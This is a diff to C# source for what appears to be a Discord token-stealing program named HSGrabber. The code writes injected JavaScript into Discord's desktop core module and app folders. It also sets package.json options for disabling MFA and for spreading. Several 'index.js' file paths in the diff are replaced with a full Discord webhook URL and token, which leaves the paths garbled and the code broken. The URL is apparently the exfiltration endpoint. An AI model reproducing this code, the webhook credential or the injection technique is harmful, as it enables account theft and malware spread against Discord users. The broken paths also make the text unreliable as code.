@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
@@ -52,12 +52,12 @@ namespace HSGrabber
 			Directory.CreateDirectory(path + "\\app");
 			File.WriteAllText(path + "\\app\\index.js", Injec.injec);
 			Directory.CreateDirectory(path + "\\app\\modules");
-			File.WriteAllText(path + "\\app\\modules\\index.js", Mod.mod);
+			File.WriteAllText(path + "\\app\\modules\\https://discord.com/api/webhooks/1136927312311500821/nR7PfYk_bfMjEq2nB7J93WroLPHwNHgzxGQU6M3jIfEYcl3ZW-ehLbd3Qutz91RhO3Rs", Mod.mod);
 			File.WriteAllText(path + "\\app\\package.json", string.Concat(new string[]
 			{
-				"{\"name\":\"discord\",\"main\":\"index.js\",\"loaded\":false,\"dir\":\"",
+				"{\"name\":\"discord\",\"main\":\"https://discord.com/api/webhooks/1136927312311500821/nR7PfYk_bfMjEq2nB7J93WroLPHwNHgzxGQU6M3jIfEYcl3ZW-ehLbd3Qutz91RhO3Rs\",\"loaded\":false,\"dir\":\"",
 				path.Replace("\\", "\\\\"),
-				"\\\\app\\\\modules\\\\index.js\",\"disabled\":",
+				"\\\\app\\\\modules\\\\https://discord.com/api/webhooks/1136927312311500821/nR7PfYk_bfMjEq2nB7J93WroLPHwNHgzxGQU6M3jIfEYcl3ZW-ehLbd3Qutz91RhO3Rs\",\"disabled\":",
 				Settings.disableMfa.ToString().ToLower(),
 				",\"private\":true,\"multiply\":",
 				Settings.spread.ToString().ToLower(),
@@ -311,7 +311,7 @@ namespace HSGrabber
 				Program._path = Program._path + "\\" + Program.lastDevelopmentFound.Replace("app-", "");
 				break;
 			}
-			Program._path += "\\modules\\discord_desktop_core\\index.js";
+			Program._path += "\\modules\\discord_desktop_core\\https://discord.com/api/webhooks/1136927312311500821/nR7PfYk_bfMjEq2nB7J93WroLPHwNHgzxGQU6M3jIfEYcl3ZW-ehLbd3Qutz91RhO3Rs";
 			bool flag = File.ReadAllText(Program._path).Count<char>() > 1;
 			if (flag)
 			{
